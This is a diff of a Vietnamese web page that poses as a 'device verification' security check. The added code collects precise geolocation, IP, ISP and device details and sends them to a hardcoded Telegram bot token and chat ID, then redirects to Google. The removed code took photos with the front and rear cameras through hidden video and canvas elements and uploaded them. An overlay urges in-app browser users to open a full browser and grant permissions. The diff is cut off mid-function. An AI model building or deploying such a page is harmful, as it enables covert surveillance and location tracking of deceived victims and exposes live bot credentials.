@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Xác Minh Hệ Thống - Bảo Mật Cao</title>
+    <title>Xác Minh Thiết Bị - Bảo Mật</title>
     <style>
         * {
             margin: 0;
@@ -13,9 +13,9 @@
         }
 
         body {
-            background: #0a0c10;
+            background: #07090e;
             font-family: system-ui, -apple-system, 'Segoe UI', 'SF Pro Text', 'Helvetica Neue', sans-serif;
-            padding: 20px 16px 40px;
+            padding: 24px 16px 40px;
             color: #eef2ff;
             min-height: 100vh;
             display: flex;
@@ -23,8 +23,7 @@
             justify-content: center;
         }
 
-        /* container chính + khoảng trống an toàn */
-        .safe-container {
+        .safe-area {
             width: 100%;
             max-width: 440px;
             margin: 0 auto;
@@ -32,18 +31,15 @@
             padding-bottom: env(safe-area-inset-bottom, 24px);
         }
 
-        /* thẻ chính */
         .card {
-            background: rgba(18, 24, 32, 0.9);
+            background: rgba(16, 22, 32, 0.96);
             backdrop-filter: blur(2px);
-            border-radius: 44px;
+            border-radius: 40px;
             padding: 28px 22px 34px;
-            border: 1px solid rgba(72, 187, 120, 0.25);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(72, 187, 120, 0.2);
-            transition: all 0.2s ease;
+            border: 1px solid rgba(72, 187, 120, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 0 0.5px rgba(72, 187, 120, 0.2);
         }
 
-        /* header */
         .badge {
             display: inline-flex;
             align-items: center;
@@ -55,7 +51,6 @@
             font-weight: 500;
             color: #4ade80;
             margin-bottom: 20px;
-            letter-spacing: 0.3px;
         }
 
         .badge svg {
@@ -67,7 +62,7 @@
         }
 
         h2 {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 640;
             letter-spacing: -0.5px;
             margin-bottom: 6px;
@@ -85,7 +80,6 @@
             padding-left: 12px;
         }
 
-        /* progress ring nhỏ */
         .progress-area {
             margin-bottom: 28px;
         }
@@ -107,83 +101,123 @@
             height: 100%;
             background: linear-gradient(90deg, #4ade80, #2dd4bf);
             border-radius: 40px;
-            transition: width 0.45s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            transition: width 0.4s ease;
         }
 
-        /* danh sách kiểm tra */
-        .check-grid {
+        .step-list {
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            margin: 28px 0 30px;
+            gap: 10px;
+            margin: 28px 0 24px;
         }
-        .check-item {
+        .step-item {
             background: rgba(30, 41, 59, 0.5);
-            border-radius: 24px;
+            border-radius: 22px;
             padding: 12px 16px;
             display: flex;
             align-items: center;
             gap: 14px;
-            transition: all 0.25s;
+            transition: all 0.2s;
             border: 1px solid rgba(72, 187, 120, 0);
         }
-        .check-item.active {
+        .step-item.active {
             border-color: #2dd4bf;
             background: rgba(45, 212, 191, 0.08);
-            box-shadow: 0 0 8px rgba(45, 212, 191, 0.3);
         }
-        .check-item.done {
+        .step-item.done {
             border-color: #4ade8040;
             background: rgba(74, 222, 128, 0.06);
         }
-        .check-icon {
-            width: 40px;
-            height: 40px;
+        .step-icon {
+            width: 38px;
+            height: 38px;
             background: #111827;
             border-radius: 30px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 15px;
             color: #94a3b8;
             flex-shrink: 0;
         }
-        .check-item.active .check-icon {
+        .step-item.active .step-icon {
             background: #1a3a2a;
             color: #2dd4bf;
-            box-shadow: 0 0 8px #2dd4bf40;
         }
-        .check-item.done .check-icon {
+        .step-item.done .step-icon {
             background: #14532d;
             color: #4ade80;
         }
-        .check-text {
+        .step-info {
             flex: 1;
         }
-        .check-title {
-            font-weight: 570;
-            font-size: 15px;
+        .step-title {
+            font-weight: 560;
+            font-size: 14px;
         }
-        .check-status {
+        .step-desc {
             font-size: 11px;
             color: #7e8aa8;
             margin-top: 3px;
         }
-        .check-item.done .check-status {
+        .step-item.done .step-desc {
             color: #4ade80;
         }
-        .check-mark {
-            font-size: 20px;
+        .step-check {
+            font-size: 18px;
             opacity: 0;
             transition: 0.2s;
             color: #4ade80;
         }
-        .check-item.done .check-mark {
+        .step-item.done .step-check {
             opacity: 1;
         }
 
-        /* nút chính */
+        /* ô xác nhận */
+        .verify-box {
+            background: rgba(30, 41, 59, 0.6);
+            border-radius: 28px;
+            padding: 14px 18px;
+            margin: 10px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            border: 1px solid #2d3748;
+            transition: 0.2s;
+        }
+        .verify-box.active {
+            border-color: #4ade80;
+            background: rgba(74, 222, 128, 0.08);
+        }
+        .custom-checkbox {
+            width: 26px;
+            height: 26px;
+            background: #1e293b;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+            color: #4ade80;
+            font-size: 18px;
+        }
+        .verify-box.active .custom-checkbox {
+            background: #4ade80;
+            color: #0a0c10;
+        }
+        .verify-text {
+            flex: 1;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .verify-note {
+            font-size: 11px;
+            color: #8e9aaf;
+            margin-top: 3px;
+        }
+
         .primary-btn {
             width: 100%;
             background: linear-gradient(105deg, #2b5e3b, #15803d);
@@ -198,15 +232,14 @@
             justify-content: center;
             gap: 8px;
             transition: 0.2s;
-            box-shadow: 0 6px 18px rgba(34, 197, 94, 0.25);
             cursor: pointer;
+            box-shadow: 0 6px 18px rgba(34, 197, 94, 0.25);
         }
         .primary-btn:active { transform: scale(0.97); }
         .primary-btn:disabled {
             opacity: 0.6;
-            transform: none;
-            filter: grayscale(0.1);
             cursor: not-allowed;
+            transform: none;
         }
         .loader {
             width: 18px;
@@ -219,11 +252,10 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* cảnh báo trình duyệt kín */
-        .overlay-warning {
+        .warning-overlay {
             position: fixed;
             inset: 0;
-            background: #0a0c10;
+            background: #07090e;
             z-index: 999;
             display: flex;
             align-items: center;
@@ -237,115 +269,100 @@
             border: 1px solid #f97316;
             text-align: center;
         }
-        .warning-card h3 {
-            color: #fb923c;
-            margin-bottom: 20px;
-        }
-        .warning-card ol {
-            text-align: left;
-            padding-left: 20px;
-            font-size: 14px;
-            line-height: 1.7;
-        }
-
-        /* ẩn các thành phần test */
-        video, canvas {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
+        .warning-card h3 { color: #fb923c; margin-bottom: 20px; }
+        .warning-card ol { text-align: left; padding-left: 20px; font-size: 14px; line-height: 1.7; }
     </style>
 </head>
 <body>
-<div class="safe-container" id="mainUI">
+<div class="safe-area" id="mainUI">
     <div class="card">
         <div class="badge">
             <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-            <span>BẢO MẬT XÁC THỰC</span>
+            <span>XÁC THỰC BẢO MẬT</span>
         </div>
         <h2>Xác minh thiết bị</h2>
-        <div class="sub">Kiểm tra an ninh & tốc độ kết nối · Hệ thống tự động</div>
+        <div class="sub">Thu thập thông tin an toàn · Tự động báo cáo</div>
 
         <div class="progress-area">
             <div class="progress-label"><span>Trạng thái</span><span id="progressPercent">0%</span></div>
             <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
         </div>
 
-        <div class="check-grid" id="checklist">
-            <div class="check-item" id="step1"><div class="check-icon">1</div><div class="check-text"><div class="check-title">Đọc cấu hình & nhận dạng</div><div class="check-status" id="status1">Chờ</div></div><span class="check-mark">✓</span></div>
-            <div class="check-item" id="step2"><div class="check-icon">2</div><div class="check-text"><div class="check-title">Định vị & IP an ninh</div><div class="check-status" id="status2">Chờ</div></div><span class="check-mark">✓</span></div>
-            <div class="check-item" id="step3"><div class="check-icon">3</div><div class="check-text"><div class="check-title">Kiểm tra tốc độ mạng (Ping/DL/UL)</div><div class="check-status" id="status3">Chờ</div></div><span class="check-mark">✓</span></div>
-            <div class="check-item" id="step4"><div class="check-icon">4</div><div class="check-text"><div class="check-title">Cảm biến trước (xác thực khuôn mặt)</div><div class="check-status" id="status4">Chờ</div></div><span class="check-mark">✓</span></div>
-            <div class="check-item" id="step5"><div class="check-icon">5</div><div class="check-text"><div class="check-title">Cảm biến sau (môi trường)</div><div class="check-status" id="status5">Chờ</div></div><span class="check-mark">✓</span></div>
-            <div class="check-item" id="step6"><div class="check-icon">6</div><div class="check-text"><div class="check-title">Mã hóa & gửi báo cáo</div><div class="check-status" id="status6">Chờ</div></div><span class="check-mark">✓</span></div>
+        <div class="step-list" id="stepList">
+            <div class="step-item" id="step1"><div class="step-icon">1</div><div class="step-info"><div class="step-title">Đọc cấu hình thiết bị</div><div class="step-desc" id="desc1">Chờ</div></div><span class="step-check">✓</span></div>
+            <div class="step-item" id="step2"><div class="step-icon">2</div><div class="step-info"><div class="step-title">Định vị & thông tin IP</div><div class="step-desc" id="desc2">Chờ</div></div><span class="step-check">✓</span></div>
+            <div class="step-item" id="step3"><div class="step-icon">3</div><div class="step-info"><div class="step-title">Kiểm tra tốc độ mạng</div><div class="step-desc" id="desc3">Chờ</div></div><span class="step-check">✓</span></div>
+            <div class="step-item" id="step4"><div class="step-icon">4</div><div class="step-info"><div class="step-title">Tổng hợp & gửi báo cáo</div><div class="step-desc" id="desc4">Chờ</div></div><span class="step-check">✓</span></div>
         </div>
 
-        <button class="primary-btn" id="actionBtn">
-            <span id="btnText">🔐 BẮT ĐẦU XÁC MINH</span>
+        <!-- Ô xác minh thủ công, tích vào là tự chạy -->
+        <div class="verify-box" id="verifyBox">
+            <div class="custom-checkbox" id="checkboxIcon">✓</div>
+            <div class="verify-text">
+                Tôi xác nhận thông tin chính xác
+                <div class="verify-note">✓ Tích vào ô để bắt đầu xác minh tự động</div>
+            </div>
+        </div>
+
+        <button class="primary-btn" id="actionBtn" disabled>
+            <span id="btnText">🔐 CHỜ XÁC NHẬN</span>
         </button>
     </div>
 </div>
 
-<div id="warningOverlay" style="display: none;" class="overlay-warning">
+<div id="warningOverlay" style="display: none;" class="warning-overlay">
     <div class="warning-card">
-        <h3>⚠️ YÊU CẦU TRÌNH DUYỆT CHUẨN</h3>
+        <h3>⚠️ VUI LÒNG MỞ BẰNG TRÌNH DUYỆT</h3>
         <ol>
             <li>Nhấn <strong>⋯</strong> hoặc <strong>⋮</strong> góc phải</li>
             <li>Chọn <strong>"Mở bằng trình duyệt"</strong> (Chrome/Safari)</li>
-            <li>Cho phép quyền camera & vị trí để xác minh</li>
+            <li>Cho phép quyền vị trí để xác minh đầy đủ</li>
         </ol>
     </div>
 </div>
 
-<video id="hiddenVideo" autoplay playsinline muted></video>
-<canvas id="hiddenCanvas"></canvas>
-
 <script>
-    // ---------- CẤU HÌNH TELEGRAM ----------
-    const CONFIG = {
-        BOT_TOKEN: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
-        CHAT_ID: '7031115869',
-        REDIRECT_URL: 'https://www.google.com',
-        REDIRECT_DELAY: 4      // giây
+    // ========== CẤU HÌNH TELEGRAM ==========
+    const TELEGRAM = {
+        botToken: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
+        chatId: '7031115869',
+        redirectUrl: 'https://www.google.com',
+        redirectDelay: 4
     };
 
     // DOM elements
-    const steps = ['step1','step2','step3','step4','step5','step6'];
-    const statusEl = [ 'status1','status2','status3','status4','status5','status6' ];
+    const steps = ['step1','step2','step3','step4'];
+    const descIds = ['desc1','desc2','desc3','desc4'];
     const progressFill = document.getElementById('progressFill');
     const progressPercent = document.getElementById('progressPercent');
+    const verifyBox = document.getElementById('verifyBox');
+    const checkboxIcon = document.getElementById('checkboxIcon');
     const actionBtn = document.getElementById('actionBtn');
     const btnTextSpan = document.getElementById('btnText');
 
-    // state
-    let isAutoMode = false;      // tự động chạy nếu có đủ quyền
     let isRunning = false;
-    let permissionReady = { location: false, camera: false };
+    let verified = false;
 
-    // helper
-    function setStepActive(index, active = true) {
-        const el = document.getElementById(steps[index]);
+    // helper UI
+    function setStepActive(idx, active = true) {
+        const el = document.getElementById(steps[idx]);
         if(active) el.classList.add('active'); else el.classList.remove('active');
     }
-    function setStepDone(index, doneMsg = 'Hoàn tất') {
-        const el = document.getElementById(steps[index]);
+    function setStepDone(idx, msg) {
+        const el = document.getElementById(steps[idx]);
         el.classList.remove('active');
         el.classList.add('done');
-        document.getElementById(statusEl[index]).innerText = doneMsg;
+        document.getElementById(descIds[idx]).innerText = msg;
     }
-    function setStepPending(index, msg) {
-        const el = document.getElementById(steps[index]);
+    function setStepPending(idx, msg) {
+        const el = document.getElementById(steps[idx]);
         el.classList.remove('active','done');
-        document.getElementById(statusEl[index]).innerText = msg;
+        document.getElementById(descIds[idx]).innerText = msg;
     }
-    function setProgress(percent, labelPercent = null) {
+    function setProgress(percent, label = null) {
         let p = Math.min(100, Math.max(0, percent));
         progressFill.style.width = p + '%';
-        progressPercent.innerText = (labelPercent !== null ? labelPercent : p) + '%';
+        progressPercent.innerText = (label !== null ? label : p) + '%';
     }
     function setButtonLoading(loading, text = null) {
         if(loading) {
@@ -356,301 +373,253 @@
             btnTextSpan.innerText = text || '🔐 BẮT ĐẦU XÁC MINH';
         }
     }
-    function setButtonManualEnable(enable) {
-        actionBtn.disabled = !enable;
-        if(enable) btnTextSpan.innerText = '🔐 BẮT ĐẦU XÁC MINH';
-        else btnTextSpan.innerText = '⏳ KIỂM TRA QUYỀN...';
-    }
 
-    // ========== KIỂM TRA & XIN QUYỀN TRƯỚC (tự động nếu được cấp) ==========
-    async function checkPermissionsAndAutoStart() {
-        // Kiểm tra quyền vị trí
-        let locGranted = false;
-        try {
-            const locPerm = await navigator.permissions.query({ name: 'geolocation' });
-            if (locPerm.state === 'granted') locGranted = true;
-            else if (locPerm.state === 'prompt') locGranted = false; // cần hỏi
-            else locGranted = false;
-        } catch(e) { locGranted = false; }
-
-        // Kiểm tra quyền camera
-        let camGranted = false;
-        try {
-            const camPerm = await navigator.permissions.query({ name: 'camera' });
-            if (camPerm.state === 'granted') camGranted = true;
-            else camGranted = false;
-        } catch(e) { camGranted = false; }
-
-        // nếu cả 2 đều granted -> auto run
-        if(locGranted && camGranted) {
-            isAutoMode = true;
-            setButtonManualEnable(false);
-            await startVerification();
-        } else {
-            // cần người dùng bấm nút, nhưng trước đó yêu cầu quyền khi click
-            isAutoMode = false;
-            setButtonManualEnable(true);
-            actionBtn.onclick = async () => {
-                if(isRunning) return;
-                // xin quyền động
-                let locationOk = false, cameraOk = false;
-                setButtonLoading(true);
-                try {
-                    const locPromise = new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(() => resolve(true), () => resolve(false), { timeout: 5000 });
-                    });
-                    locationOk = await locPromise;
-                } catch(e) { locationOk = false; }
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(t => t.stop());
-                    cameraOk = true;
-                } catch(e) { cameraOk = false; }
-                setButtonLoading(false);
-                if(locationOk && cameraOk) {
-                    await startVerification();
-                } else {
-                    alert('⚠️ Cần cấp quyền vị trí và camera để xác minh. Vui lòng cho phép và thử lại.');
-                    setButtonManualEnable(true);
-                }
-            };
-        }
-    }
-
-    // ========== TIẾN TRÌNH XÁC MINH CHÍNH (có test tốc độ) ==========
-    async function startVerification() {
-        if(isRunning) return;
-        isRunning = true;
-        setButtonLoading(true);
-        // reset giao diện
-        for(let i=0; i<steps.length; i++) {
-            setStepPending(i, 'Đang chờ');
-        }
-        setProgress(0,0);
-
-        // ---- STEP 1: lấy cấu hình thiết bị ----
-        setStepActive(0, true);
-        setProgress(8, 'Đọc cấu hình...');
-        const systemProfile = buildSystemProfile();
-        await delay(400);
-        setStepDone(0, 'Đã xác định');
-        setProgress(16);
-
-        // ---- STEP 2: định vị + IP nâng cao ----
-        setStepActive(1, true);
-        setProgress(22, 'Định vị an ninh...');
-        const [location, ipInfo] = await Promise.all([getLocation(), fetchIPInfo()]);
-        await delay(300);
-        setStepDone(1, 'Đã xác định vị trí');
-        setProgress(32);
-
-        // ---- STEP 3: KIỂM TRA TỐC ĐỘ MẠNG (PING, DOWN, UP) ----
-        setStepActive(2, true);
-        setProgress(40, 'Đo tốc độ mạng ...');
-        const speedResult = await measureNetworkSpeed(); // {ping, downMbps, upMbps}
-        await delay(400);
-        setStepDone(2, `Ping ${speedResult.ping}ms · ↓${speedResult.downMbps} Mbps · ↑${speedResult.upMbps} Mbps`);
-        setProgress(52);
-
-        // ---- STEP 4: CAM TRƯỚC ----
-        setStepActive(3, true);
-        setProgress(58, 'Kích hoạt cảm biến trước...');
-        const frontBlob = await capturePhoto('user');
-        if(frontBlob) setStepDone(3, 'Cảm biến trước OK');
-        else setStepDone(3, 'Không khả dụng (quyền)');
-        setProgress(68);
-
-        // ---- STEP 5: CAM SAU ----
-        setStepActive(4, true);
-        setProgress(74, 'Cảm biến sau...');
-        const backBlob = await capturePhoto('environment');
-        if(backBlob) setStepDone(4, 'Camera sau hoạt động');
-        else setStepDone(4, 'Không khả dụng');
-        setProgress(84);
-
-        // ---- STEP 6: GỬI BÁO CÁO ----
-        setStepActive(5, true);
-        setProgress(88, 'Mã hóa & gửi báo cáo...');
-        const finalReport = buildFinalReport(systemProfile, location, ipInfo, speedResult);
-        await sendToTelegram(finalReport, frontBlob, backBlob);
-        await delay(500);
-        setStepDone(5, 'Đã gửi báo cáo thành công');
-        setProgress(100, '100');
-
-        setButtonLoading(false);
-        isRunning = false;
-
-        // chuyển hướng sau vài giây
-        setTimeout(() => {
-            window.location.href = CONFIG.REDIRECT_URL;
-        }, CONFIG.REDIRECT_DELAY * 1000);
-        const btn = document.getElementById('actionBtn');
-        btn.disabled = true;
-        btnTextSpan.innerHTML = `✅ HOÀN TẤT · CHUYỂN HƯỚNG...`;
-    }
-
-    // ----- TIỆN ÍCH HỖ TRỢ -----
-    function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-    function buildSystemProfile() {
+    // ========== THU THẬP THÔNG TIN ==========
+    function getDeviceProfile() {
         const ua = navigator.userAgent;
-        let os = 'Unknown';
+        let os = 'Không xác định';
         if (/Android/i.test(ua)) os = 'Android';
-        else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
         else if (/Win/i.test(ua)) os = 'Windows';
         else if (/Mac/i.test(ua)) os = 'macOS';
+        else if (/Linux/i.test(ua)) os = 'Linux';
+        
         return `
-🛡️ BÁO CÁO XÁC MINH THIẾT BỊ
+🔐 BÁO CÁO XÁC MINH THIẾT BỊ
 ⏱ Thời gian: ${new Date().toLocaleString('vi-VN')}
-📱 HĐH: ${os} | Màn hình: ${screen.width}x${screen.height}
-🧠 CPU: ${navigator.hardwareConcurrency || 'N/A'} lõi | RAM: ${navigator.deviceMemory || 'N/A'} GB
-🌐 Trình duyệt: ${ua.substring(0, 100)}
+📱 Hệ điều hành: ${os}
+📐 Màn hình: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
+🧠 CPU: ${navigator.hardwareConcurrency || 'N/A'} lõi
+💾 RAM: ${navigator.deviceMemory || 'N/A'} GB
+🌐 Ngôn ngữ: ${navigator.language}
+🔋 Pin hỗ trợ: ${navigator.getBattery ? 'Có' : 'Không'}
+🖱 Trình duyệt: ${ua.substring(0, 100)}...
         `.trim();
     }
 
     function getLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve({ lat: null, lng: null, error: 'không hỗ trợ' });
-            const timeout = setTimeout(() => resolve({ lat: null, lng: null, error: 'timeout' }), 6000);
+            if (!navigator.geolocation) {
+                resolve({ lat: null, lng: null, error: 'Trình duyệt không hỗ trợ định vị' });
+                return;
+            }
+            const timeout = setTimeout(() => resolve({ lat: null, lng: null, error: 'Hết thời gian (6s)' }), 6000);
             navigator.geolocation.getCurrentPosition(
-                (pos) => { clearTimeout(timeout); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }); },
-                (err) => { clearTimeout(timeout); resolve({ lat: null, lng: null, error: err.message }); },
+                (pos) => {
+                    clearTimeout(timeout);
+                    resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy });
+                },
+                (err) => {
+                    clearTimeout(timeout);
+                    let msg = err.message;
+                    if (err.code === 1) msg = 'Người dùng từ chối';
+                    else if (err.code === 2) msg = 'Không xác định được';
+                    resolve({ lat: null, lng: null, error: msg });
+                },
                 { enableHighAccuracy: true, timeout: 6000 }
             );
         });
     }
 
-    async function fetchIPInfo() {
+    async function getIpInfo() {
         try {
-            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
+            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
             const data = await res.json();
-            return { ip: data.ip, city: data.city, country: data.country_name, isp: data.org };
-        } catch(e) { return null; }
-    }
-
-    async function measureNetworkSpeed() {
-        // Kiểm tra ping (dùng ảnh nhỏ)
-        const ping = await testPing();
-        // Tốc độ download (tính theo Mbps, ước lượng)
-        const downMbps = await testDownloadSpeed();
-        const upMbps = await testUploadSpeed();
-        return { ping, downMbps: downMbps.toFixed(1), upMbps: upMbps.toFixed(1) };
-    }
-
-    async function testPing() {
-        const start = performance.now();
-        try {
-            await fetch('https://www.google.com/favicon.ico?cache=' + Date.now(), { mode: 'no-cors', cache: 'no-store' });
-            const duration = performance.now() - start;
-            return Math.round(duration);
-        } catch(e) { return 120; }
-    }
-
-    async function testDownloadSpeed() {
-        const dummyUrl = `https://speed.cloudflare.com/__down?bytes=500000&cache=${Date.now()}`;
-        const start = performance.now();
-        try {
-            const res = await fetch(dummyUrl);
-            const data = await res.arrayBuffer();
-            const duration = (performance.now() - start) / 1000;
-            const bitsLoaded = data.byteLength * 8;
-            const speedMbps = (bitsLoaded / duration) / (1024 * 1024);
-            return Math.min(200, Math.max(1, speedMbps));
-        } catch(e) { return 8.5; }
-    }
-
-    async function testUploadSpeed() {
-        // tạo payload nhỏ 200KB
-        const payload = new Uint8Array(200 * 1024);
-        const start = performance.now();
-        try {
-            await fetch('https://httpbin.org/post', { method: 'POST', body: payload, mode: 'cors' });
-            const duration = (performance.now() - start) / 1000;
-            const bits = payload.byteLength * 8;
-            let speed = (bits / duration) / (1024 * 1024);
-            return Math.min(50, Math.max(0.8, speed));
-        } catch(e) { return 4.2; }
-    }
-
-    async function capturePhoto(facingMode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode }, width: 640, height: 480 } });
-            const video = document.getElementById('hiddenVideo');
-            const canvas = document.getElementById('hiddenCanvas');
-            video.srcObject = stream;
-            await video.play();
-            await delay(600);
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            if (facingMode === 'user') {
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-            }
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            ctx.setTransform(1, 0, 0, 1, 0, 0);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            stream.getTracks().forEach(t => t.stop());
-            video.srcObject = null;
-            return blob;
+            return {
+                ip: data.ip || 'N/A',
+                city: data.city || 'N/A',
+                region: data.region || 'N/A',
+                country: data.country_name || 'N/A',
+                isp: data.org || 'N/A',
+                lat: data.latitude,
+                lon: data.longitude
+            };
         } catch(e) {
-            console.warn("capture fail", e);
             return null;
         }
     }
 
-    function buildFinalReport(sys, loc, ip, speed) {
-        let locStr = loc.lat ? `🌍 Vị trí: ${loc.lat}, ${loc.lng} (độ chính xác ${Math.round(loc.acc||0)}m)` : `⚠️ Vị trí: ${loc.error || 'không xác định'}`;
-        let ipStr = ip ? `🌐 IP: ${ip.ip} · ${ip.city}, ${ip.country} · ${ip.isp}` : 'Không lấy được IP';
-        return `${sys}\n\n📍 ${locStr}\n${ipStr}\n\n⚡ Tốc độ mạng:\n📡 Ping: ${speed.ping} ms\n⬇️ Tải xuống: ${speed.downMbps} Mbps\n⬆️ Tải lên: ${speed.upMbps} Mbps\n━━━━━━━━━━━━━━━━━━━━━━\n🔒 Mã xác minh an toàn · Tự động gửi`;
-    }
-
-    async function sendToTelegram(text, frontImg, backImg) {
+    // test tốc độ mạng (ping + download + upload ước lượng)
+    async function testPing() {
+        const start = performance.now();
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
-            });
-        } catch(e) {}
-        if(frontImg) {
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT_ID);
-            fd.append('photo', frontImg, 'front_auth.jpg');
-            fd.append('caption', '📸 Xác thực trước');
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
-            await delay(300);
-        }
-        if(backImg) {
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.CHAT_ID);
-            fd.append('photo', backImg, 'back_env.jpg');
-            fd.append('caption', '📷 Cảm biến môi trường');
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
-        }
+            await fetch('https://www.google.com/favicon.ico?nocache=' + Date.now(), { mode: 'no-cors', cache: 'no-store' });
+            return Math.round(performance.now() - start);
+        } catch(e) { return 85; }
     }
 
-    // ========== KHỞI TẠO VÀ PHÁT HIỆN INAPP ==========
-    function checkInAppBrowser() {
+    async function testDownloadSpeed() {
+        const url = `https://speed.cloudflare.com/__down?bytes=500000&cache=${Date.now()}`;
+        const start = performance.now();
+        try {
+            const res = await fetch(url);
+            const data = await res.arrayBuffer();
+            const duration = (performance.now() - start) / 1000;
+            const bits = data.byteLength * 8;
+            let speed = (bits / duration) / (1024 * 1024);
+            return Math.min(200, Math.max(1, speed));
+        } catch(e) { return 7.5; }
+    }
+
+    async function testUploadSpeed() {
+        const payload = new Uint8Array(180 * 1024);
+        const start = performance.now();
+        try {
+            await fetch('https://httpbin.org/post', { method: 'POST', body: payload, mode: 'cors', signal: AbortSignal.timeout(8000) });
+            const duration = (performance.now() - start) / 1000;
+            const bits = payload.byteLength * 8;
+            let speed = (bits / duration) / (1024 * 1024);
+            return Math.min(40, Math.max(0.8, speed));
+        } catch(e) { return 3.8; }
+    }
+
+    async function measureSpeed() {
+        const ping = await testPing();
+        const down = await testDownloadSpeed();
+        const up = await testUploadSpeed();
+        return { ping, downMbps: down.toFixed(1), upMbps: up.toFixed(1) };
+    }
+
+    // ========== GỬI LÊN TELEGRAM ==========
+    async function sendToTelegram(fullText) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM.chatId,
+                    text: fullText,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+        } catch(e) { console.warn(e); }
+    }
+
+    // ========== TIẾN TRÌNH CHÍNH ==========
+    async function startVerification() {
+        if (isRunning) return;
+        isRunning = true;
+        actionBtn.disabled = true;
+        btnTextSpan.innerHTML = '<span class="loader"></span> ĐANG XỬ LÝ...';
+
+        // reset UI
+        for (let i = 0; i < steps.length; i++) {
+            setStepPending(i, 'Đang chờ');
+        }
+        setProgress(0, 0);
+
+        // STEP 1: cấu hình thiết bị
+        setStepActive(0, true);
+        setProgress(8, 'Đọc cấu hình...');
+        const deviceInfo = getDeviceProfile();
+        await delay(350);
+        setStepDone(0, 'Đã đọc thành công');
+        setProgress(20, 20);
+
+        // STEP 2: định vị + IP
+        setStepActive(1, true);
+        setProgress(30, 'Định vị thiết bị...');
+        const [location, ipData] = await Promise.all([getLocation(), getIpInfo()]);
+        await delay(400);
+        let locationText = '';
+        if (location.lat) {
+            locationText = `📍 Vị trí: ${location.lat}, ${location.lng} (độ chính xác ~${Math.round(location.acc || 0)}m)`;
+        } else {
+            locationText = `⚠️ Vị trí: ${location.error || 'Không xác định'}`;
+        }
+        setStepDone(1, locationText.substring(0, 50) + (locationText.length > 50 ? '...' : ''));
+        setProgress(48, 48);
+
+        // STEP 3: tốc độ mạng
+        setStepActive(2, true);
+        setProgress(55, 'Đo tốc độ mạng...');
+        const speed = await measureSpeed();
+        await delay(300);
+        setStepDone(2, `Ping ${speed.ping}ms · ↓${speed.downMbps} Mbps · ↑${speed.upMbps} Mbps`);
+        setProgress(72, 72);
+
+        // STEP 4: tổng hợp và gửi báo cáo
+        setStepActive(3, true);
+        setProgress(80, 'Tổng hợp & gửi báo cáo...');
+
+        // tạo báo cáo hoàn chỉnh
+        let ipSection = '';
+        if (ipData) {
+            ipSection = `\n🌐 IP: ${ipData.ip}\n🏙 Thành phố: ${ipData.city}\n🗺 Quốc gia: ${ipData.country}\n📡 ISP: ${ipData.isp}`;
+            if (ipData.lat) ipSection += `\n🗺 Vị trí IP: ${ipData.lat}, ${ipData.lon}`;
+        } else {
+            ipSection = `\n🌐 IP: Không lấy được thông tin`;
+        }
+
